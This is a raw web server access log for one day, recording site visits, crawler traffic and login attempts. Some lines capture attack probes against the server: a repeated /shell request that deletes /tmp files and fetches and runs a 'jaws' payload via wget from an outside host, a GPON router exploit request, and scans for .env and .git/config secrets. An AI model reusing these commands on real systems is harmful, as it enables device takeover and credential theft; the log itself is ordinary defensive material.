86.52.116.15 - - [17/Jul/2025:12:31:46 +0000] "GET / HTTP/1.0" 200 10945 "-" "-"
95.214.52.169 - - [17/Jul/2025:12:32:34 +0000] "GET / HTTP/1.1" 200 3423 "-" "Mozilla/5.0"
157.230.178.76 - - [17/Jul/2025:12:53:03 +0000] "GET / HTTP/1.0" 200 10945 "-" "\"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0\""
149.50.96.5 - - [17/Jul/2025:13:03:51 +0000] "GET /login.asp HTTP/1.1" 404 456 "-" "-"
49.51.243.156 - - [17/Jul/2025:13:06:57 +0000] "GET / HTTP/1.1" 200 3423 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
87.236.176.56 - - [17/Jul/2025:13:09:20 +0000] "GET / HTTP/1.1" 200 3423 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
134.209.209.253 - - [17/Jul/2025:13:13:20 +0000] "GET / HTTP/1.1" 200 10926 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"
134.209.209.253 - - [17/Jul/2025:13:13:21 +0000] "GET /favicon.ico HTTP/1.1" 404 450 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"
134.209.209.253 - - [17/Jul/2025:13:13:21 +0000] "GET /robots.txt HTTP/1.1" 404 450 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"
149.50.96.5 - - [17/Jul/2025:13:16:35 +0000] "GET / HTTP/1.1" 200 3423 "-" "Mozilla/5.0"
43.135.133.194 - - [17/Jul/2025:13:21:04 +0000] "GET / HTTP/1.1" 200 3423 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
162.62.213.165 - - [17/Jul/2025:13:29:20 +0000] "GET /manual HTTP/1.1" 404 456 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
43.167.157.80 - - [17/Jul/2025:13:38:06 +0000] "GET /manual HTTP/1.1" 404 456 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
184.73.109.159 - - [17/Jul/2025:13:38:19 +0000] "GET / HTTP/1.1" 200 3404 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
93.174.93.12 - - [17/Jul/2025:13:40:32 +0000] "\x16\x03\x02\x01o\x01" 400 494 "-" "-"
83.135.177.178 - - [17/Jul/2025:13:45:05 +0000] "GET / HTTP/1.1" 500 804 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
83.135.177.178 - - [17/Jul/2025:13:45:05 +0000] "GET /favicon.ico HTTP/1.1" 500 804 "http://213.165.87.118/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
83.135.177.178 - - [17/Jul/2025:13:47:39 +0000] "GET / HTTP/1.1" 500 804 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
196.251.89.45 - - [17/Jul/2025:13:48:07 +0000] "CONNECT api.ipify.org:443 HTTP/1.1" 405 504 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
149.50.96.114 - - [17/Jul/2025:13:51:01 +0000] "GET / HTTP/1.1" 500 804 "-" "Mozilla/5.0"
83.135.177.178 - - [17/Jul/2025:13:54:23 +0000] "GET / HTTP/1.1" 500 804 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
83.135.177.178 - - [17/Jul/2025:13:55:50 +0000] "GET / HTTP/1.1" 500 804 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
83.135.177.178 - - [17/Jul/2025:13:57:37 +0000] "GET / HTTP/1.1" 500 804 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
83.135.177.178 - - [17/Jul/2025:14:02:36 +0000] "GET / HTTP/1.1" 500 804 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
45.194.66.7 - - [17/Jul/2025:14:04:40 +0000] "GET / HTTP/1.1" 500 804 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
83.135.177.178 - - [17/Jul/2025:14:09:27 +0000] "GET / HTTP/1.1" 200 2835 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
83.135.177.178 - - [17/Jul/2025:14:09:28 +0000] "GET /static/style.css HTTP/1.1" 200 1523 "http://213.165.87.118/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
83.135.177.178 - - [17/Jul/2025:14:09:33 +0000] "GET /recording HTTP/1.1" 302 662 "http://213.165.87.118/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
83.135.177.178 - - [17/Jul/2025:14:09:33 +0000] "GET /login?next=%2Frecording HTTP/1.1" 200 1769 "http://213.165.87.118/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
83.135.177.178 - - [17/Jul/2025:14:09:36 +0000] "GET /dashboards HTTP/1.1" 302 684 "http://213.165.87.118/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
83.135.177.178 - - [17/Jul/2025:14:09:36 +0000] "GET /login?next=%2Fdashboards HTTP/1.1" 200 1769 "http://213.165.87.118/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
35.227.62.178 - - [17/Jul/2025:14:10:12 +0000] "GET / HTTP/1.1" 200 8684 "-" "Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)"
83.135.177.178 - - [17/Jul/2025:14:10:15 +0000] "GET /search HTTP/1.1" 302 673 "http://213.165.87.118/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
83.135.177.178 - - [17/Jul/2025:14:10:15 +0000] "GET /login?next=%2Fsearch HTTP/1.1" 200 1769 "http://213.165.87.118/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
188.102.178.33 - - [17/Jul/2025:14:13:07 +0000] "GET / HTTP/1.1" 200 2835 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0"
188.102.178.33 - - [17/Jul/2025:14:13:08 +0000] "GET /static/style.css HTTP/1.1" 200 1523 "http://213.165.87.118/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0"
83.135.177.178 - - [17/Jul/2025:14:15:56 +0000] "GET /search HTTP/1.1" 302 673 "http://213.165.87.118/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
83.135.177.178 - - [17/Jul/2025:14:15:56 +0000] "GET /login?next=%2Fsearch HTTP/1.1" 200 1769 "http://213.165.87.118/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
83.135.177.178 - - [17/Jul/2025:14:15:56 +0000] "GET /favicon.ico HTTP/1.1" 404 418 "http://213.165.87.118/login?next=%2Fsearch" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
83.135.177.178 - - [17/Jul/2025:14:29:53 +0000] "GET /login?next=%2Fsearch HTTP/1.1" 404 493 "http://213.165.87.118/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
83.135.177.178 - - [17/Jul/2025:14:29:53 +0000] "GET /favicon.ico HTTP/1.1" 404 492 "http://213.165.87.118/login?next=%2Fsearch" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
83.135.177.178 - - [17/Jul/2025:14:31:45 +0000] "GET /search HTTP/1.1" 302 673 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
83.135.177.178 - - [17/Jul/2025:14:31:45 +0000] "GET /login?next=%2Fsearch HTTP/1.1" 200 1769 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
83.135.177.178 - - [17/Jul/2025:14:31:46 +0000] "GET /favicon.ico HTTP/1.1" 404 418 "http://213.165.87.118/login?next=%2Fsearch" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
83.135.177.178 - - [17/Jul/2025:14:32:47 +0000] "GET /login?next=%2Fsearch HTTP/1.1" 200 1631 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
83.135.177.178 - - [17/Jul/2025:14:32:47 +0000] "GET /favicon.ico HTTP/1.1" 404 418 "http://213.165.87.118/login?next=%2Fsearch" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
149.50.96.5 - - [17/Jul/2025:14:36:50 +0000] "POST /bapply.cgi HTTP/1.1" 404 382 "http://213.165.87.118:80/apply.cgi" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36"
204.76.203.219 - - [17/Jul/2025:14:40:26 +0000] "GET / HTTP/1.1" 200 2835 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.242.226.116 - - [17/Jul/2025:14:50:23 +0000] "\x16\x03\x01" 400 494 "-" "-"
61.8.129.230 - - [17/Jul/2025:14:53:53 +0000] "GET / HTTP/1.1" 200 2835 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36"
61.8.129.230 - - [17/Jul/2025:14:53:53 +0000] "GET /static/style.css HTTP/1.1" 200 1523 "http://213.165.87.118/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36"
188.102.178.33 - - [17/Jul/2025:15:27:42 +0000] "GET / HTTP/1.1" 200 2835 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0"
188.102.178.33 - - [17/Jul/2025:15:27:42 +0000] "GET /static/style.css HTTP/1.1" 200 1523 "http://213.165.87.118/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0"
188.102.178.33 - - [17/Jul/2025:15:27:44 +0000] "GET /dashboards HTTP/1.1" 302 664 "http://213.165.87.118/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0"
188.102.178.33 - - [17/Jul/2025:15:27:44 +0000] "GET /login?next=%2Fdashboards HTTP/1.1" 200 1769 "http://213.165.87.118/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0"
188.102.178.33 - - [17/Jul/2025:15:27:44 +0000] "GET /favicon.ico HTTP/1.1" 404 418 "http://213.165.87.118/login?next=%2Fdashboards" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0"
188.102.178.33 - - [17/Jul/2025:15:28:19 +0000] "POST /login?next=%2Fdashboards HTTP/1.1" 500 452 "http://213.165.87.118/login?next=%2Fdashboards" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0"
188.102.178.33 - - [17/Jul/2025:15:29:12 +0000] "GET /login HTTP/1.1" 200 1631 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0"
188.102.178.33 - - [17/Jul/2025:15:29:21 +0000] "POST /login HTTP/1.1" 500 452 "http://213.165.87.118/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0"
149.50.96.5 - - [17/Jul/2025:15:29:48 +0000] "GET /cgi-bin/index.html HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36"
45.156.129.52 - - [17/Jul/2025:15:47:57 +0000] "GET / HTTP/1.1" 200 2779 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
45.156.129.52 - - [17/Jul/2025:15:48:14 +0000] "GET /console HTTP/1.1" 404 363 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
149.50.96.5 - - [17/Jul/2025:15:58:18 +0000] "GET / HTTP/1.1" 200 2835 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36"
83.135.177.178 - - [17/Jul/2025:16:03:45 +0000] "GET / HTTP/1.1" 200 2835 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
83.135.177.178 - - [17/Jul/2025:16:03:45 +0000] "GET /static/style.css HTTP/1.1" 200 1523 "http://213.165.87.118/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
83.135.177.178 - - [17/Jul/2025:16:04:35 +0000] "GET /dashboards HTTP/1.1" 302 665 "http://213.165.87.118/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
83.135.177.178 - - [17/Jul/2025:16:04:35 +0000] "GET /login?next=%2Fdashboards HTTP/1.1" 200 1769 "http://213.165.87.118/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
83.135.177.178 - - [17/Jul/2025:16:04:35 +0000] "GET /favicon.ico HTTP/1.1" 404 419 "http://213.165.87.118/login?next=%2Fdashboards" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
83.135.177.178 - - [17/Jul/2025:16:04:44 +0000] "POST /login?next=%2Fdashboards HTTP/1.1" 500 452 "http://213.165.87.118/login?next=%2Fdashboards" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
43.130.37.243 - - [17/Jul/2025:16:15:55 +0000] "GET / HTTP/1.1" 200 2798 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
45.135.193.162 - - [17/Jul/2025:16:18:40 +0000] "GET / HTTP/1.1" 200 8684 "-" "-"
95.214.52.169 - - [17/Jul/2025:16:26:22 +0000] "GET / HTTP/1.1" 200 2798 "-" "Mozilla/5.0"
43.158.91.71 - - [17/Jul/2025:16:28:54 +0000] "GET /dashboards HTTP/1.1" 302 628 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
43.158.91.71 - - [17/Jul/2025:16:28:55 +0000] "GET /login?next=%2Fdashboards HTTP/1.1" 200 1594 "http://213.165.87.118:80/dashboards" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
20.169.49.23 - - [17/Jul/2025:16:32:13 +0000] "GET /ReportServer HTTP/1.1" 404 363 "-" "Mozilla/5.0 zgrab/0.x"
149.50.96.5 - - [17/Jul/2025:16:34:26 +0000] "GET / HTTP/1.1" 200 2798 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36"
43.157.148.38 - - [17/Jul/2025:16:38:38 +0000] "GET /recording HTTP/1.1" 302 625 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
43.157.148.38 - - [17/Jul/2025:16:38:39 +0000] "GET /login?next=%2Frecording HTTP/1.1" 200 1594 "http://213.165.87.118:80/recording" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
43.130.72.177 - - [17/Jul/2025:16:49:32 +0000] "GET /search HTTP/1.1" 302 616 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
43.130.72.177 - - [17/Jul/2025:16:49:35 +0000] "GET /login?next=%2Fsearch HTTP/1.1" 200 1594 "http://213.165.87.118:80/search" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
149.50.96.5 - - [17/Jul/2025:17:23:14 +0000] "GET /admin/login.asp HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36"
185.242.226.116 - - [17/Jul/2025:17:23:54 +0000] "GET / HTTP/1.1" 200 2779 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
205.210.31.25 - - [17/Jul/2025:17:26:35 +0000] "GET / HTTP/1.1" 200 2779 "-" "Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity"
204.76.203.219 - - [17/Jul/2025:17:43:12 +0000] "GET / HTTP/1.1" 200 2835 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
68.183.15.125 - - [17/Jul/2025:18:38:34 +0000] "GET / HTTP/1.1" 200 2835 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
93.174.93.12 - - [17/Jul/2025:18:42:48 +0000] "GET / HTTP/1.0" 200 10945 "-" "Mozilla/5.0 (Linux; Android 9; ONEPLUS A6003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
149.50.96.114 - - [17/Jul/2025:18:44:21 +0000] "GET / HTTP/1.1" 200 2798 "-" "Mozilla/5.0"
188.102.178.33 - - [17/Jul/2025:18:51:32 +0000] "GET / HTTP/1.1" 200 2835 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0"
188.102.178.33 - - [17/Jul/2025:18:51:33 +0000] "GET /static/style.css HTTP/1.1" 200 1523 "http://213.165.87.118/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0"
188.102.178.33 - - [17/Jul/2025:18:51:36 +0000] "GET /search HTTP/1.1" 302 672 "http://213.165.87.118/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0"
188.102.178.33 - - [17/Jul/2025:18:51:36 +0000] "GET /login?next=%2Fsearch HTTP/1.1" 200 1769 "http://213.165.87.118/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0"
188.102.178.33 - - [17/Jul/2025:18:51:44 +0000] "POST /login?next=%2Fsearch HTTP/1.1" 500 452 "http://213.165.87.118/login?next=%2Fsearch" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0"
43.248.79.81 - - [17/Jul/2025:19:08:07 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ scamanje.stresserit.pro/jaws;sh+/tmp/jaws" 400 494 "-" "-"
43.165.67.57 - - [17/Jul/2025:19:22:37 +0000] "GET / HTTP/1.1" 200 2798 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
149.50.96.5 - - [17/Jul/2025:19:29:41 +0000] "PUT /SDK/webLanguage HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36"
170.106.152.218 - - [17/Jul/2025:19:38:19 +0000] "GET /search HTTP/1.1" 302 616 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
170.106.152.218 - - [17/Jul/2025:19:38:20 +0000] "GET /login?next=%2Fsearch HTTP/1.1" 200 1594 "http://213.165.87.118/search" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
43.158.91.71 - - [17/Jul/2025:19:46:46 +0000] "GET /dashboards HTTP/1.1" 302 628 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
43.158.91.71 - - [17/Jul/2025:19:46:47 +0000] "GET /login?next=%2Fdashboards HTTP/1.1" 200 1594 "http://213.165.87.118/dashboards" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
43.152.72.247 - - [17/Jul/2025:19:57:43 +0000] "GET /recording HTTP/1.1" 302 625 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
43.152.72.247 - - [17/Jul/2025:19:57:45 +0000] "GET /login?next=%2Frecording HTTP/1.1" 200 1594 "http://213.165.87.118/recording" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
185.218.84.47 - - [17/Jul/2025:20:11:41 +0000] "GET / HTTP/1.1" 200 8684 "-" "-"
95.214.52.169 - - [17/Jul/2025:20:16:54 +0000] "GET / HTTP/1.1" 200 2798 "-" "Mozilla/5.0"
103.210.101.102 - - [17/Jul/2025:20:22:38 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 488 "-" "Hello, World"
149.50.96.114 - - [17/Jul/2025:20:32:46 +0000] "GET / HTTP/1.1" 200 2798 "-" "Mozilla/5.0"
8.219.6.49 - - [17/Jul/2025:20:43:49 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ scamanje.stresserit.pro/jaws;sh+/tmp/jaws" 400 494 "-" "-"
8.219.50.197 - - [17/Jul/2025:20:43:50 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ scamanje.stresserit.pro/jaws;sh+/tmp/jaws" 400 494 "-" "-"
185.242.226.116 - - [17/Jul/2025:20:54:52 +0000] "\x16\x03\x01" 400 494 "-" "-"
177.11.138.42 - - [17/Jul/2025:21:10:10 +0000] "GET / HTTP/1.1" 200 8684 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
113.131.201.8 - - [17/Jul/2025:21:10:45 +0000] "GET / HTTP/1.1" 400 494 "-" "-"
199.45.155.100 - - [17/Jul/2025:21:12:43 +0000] "GET / HTTP/1.1" 200 2779 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
199.45.155.100 - - [17/Jul/2025:21:12:45 +0000] "GET /favicon.ico HTTP/1.1" 404 382 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
199.45.155.100 - - [17/Jul/2025:21:12:46 +0000] "PRI * HTTP/2.0" 400 494 "-" "-"
199.45.155.100 - - [17/Jul/2025:21:12:50 +0000] "GET /favicon.ico HTTP/1.1" 404 382 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
199.45.155.100 - - [17/Jul/2025:21:12:51 +0000] "PRI * HTTP/2.0" 400 494 "-" "-"
199.45.155.100 - - [17/Jul/2025:21:12:55 +0000] "\x16\x03\x01" 400 494 "-" "-"
199.45.155.100 - - [17/Jul/2025:21:12:55 +0000] "GET /wiki HTTP/1.1" 404 363 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
149.50.96.5 - - [17/Jul/2025:21:14:06 +0000] "GET / HTTP/1.1" 200 2798 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36"
8.219.180.252 - - [17/Jul/2025:21:25:18 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ scamanje.stresserit.pro/jaws;sh+/tmp/jaws" 400 494 "-" "-"
192.241.162.43 - - [17/Jul/2025:21:26:16 +0000] "GET /.env HTTP/1.1" 404 363 "-" "Mozilla/5.0; Keydrop.io/1.0(onlyscans.com/about);"
192.241.162.43 - - [17/Jul/2025:21:26:16 +0000] "GET /.git/config HTTP/1.1" 404 363 "-" "Mozilla/5.0; Keydrop.io/1.0(onlyscans.com/about);"
83.135.177.178 - - [17/Jul/2025:21:28:39 +0000] "GET / HTTP/1.1" 200 2835 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
83.135.177.178 - - [17/Jul/2025:21:28:39 +0000] "GET /static/style.css HTTP/1.1" 200 1523 "http://213.165.87.118/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
83.135.177.178 - - [17/Jul/2025:21:28:43 +0000] "GET /dashboards HTTP/1.1" 302 664 "http://213.165.87.118/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
83.135.177.178 - - [17/Jul/2025:21:28:43 +0000] "GET /login?next=%2Fdashboards HTTP/1.1" 200 1769 "http://213.165.87.118/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
83.135.177.178 - - [17/Jul/2025:21:28:44 +0000] "GET /favicon.ico HTTP/1.1" 404 418 "http://213.165.87.118/login?next=%2Fdashboards" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
